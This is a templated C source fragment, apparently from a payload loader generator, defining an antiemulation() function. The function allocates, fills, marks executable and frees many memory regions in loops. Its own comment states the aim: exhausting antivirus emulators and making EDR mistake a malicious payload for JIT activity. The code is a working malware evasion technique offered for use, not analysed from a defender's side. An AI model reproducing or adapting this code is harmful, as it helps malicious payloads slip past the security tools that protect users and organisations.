

/* This will allocate SIR_ALLOC_COUNT RW memory regions, 
   set them to RX, and free them. 
   And this SIR_ITERATION_COUNT times.
   
   SIR_ITERATION_COUNT: Single digits, around 5
   SIR_ALLOC_COUNT:     Tripple digits, around 100

   Memory   : SIR_ALLOC_COUNT * payload_length
   Cycles   : SIR_ALLOC_COUNT * payload_length * SIR_ITERATION_COUNT
   Time     : SIR_ALLOC_COUNT * SIR_ITERATION_COUNT * payload_length * ?
   API calls: SIR_ALLOC_COUNT * SIR_ITERATION_COUNT * 3

   The idea is that the AV emulator will probably give up, either because
   of used memory is above maximum, or amount of instructions, or 
   number of API calls, or time. 

   It hopefully also makes the EDR think this program is doing some
   kind of interpreter or JIT compilation, and not a malicious payload.
*/

void antiemulation() {
    void* allocs[{{SIR_ALLOC_COUNT}}];
    DWORD result;

    for(int i=0; i<{{SIR_ITERATION_COUNT}}; i++) {
        for(int n=0; n<{{SIR_ALLOC_COUNT}}; n++) {
            allocs[n] = VirtualAlloc(
                NULL, 
                {{PAYLOAD_LEN}}, 
                0x3000, 
                p_RW
            );
            char *ptr = allocs[n];

            // write every byte of it
            for(int i=0; i<{{PAYLOAD_LEN}}; i++) {
                ptr[i] = 0x23;
            }
        }

        for(int n=0; n<{{SIR_ALLOC_COUNT}}; n++) {
            if (VirtualProtect(
                allocs[n], 
                {{PAYLOAD_LEN}}, 
                p_RX, 
                &result) == 0) 
            {
                return;
            }
        }

        BOOL bSuccess;
        for(int n=0; n<{{SIR_ALLOC_COUNT}}; n++) {
            bSuccess = VirtualFree(
                            allocs[n],
                            {{PAYLOAD_LEN}},
                            0x00008000); // MEM_RELEASE
        }
    }
}
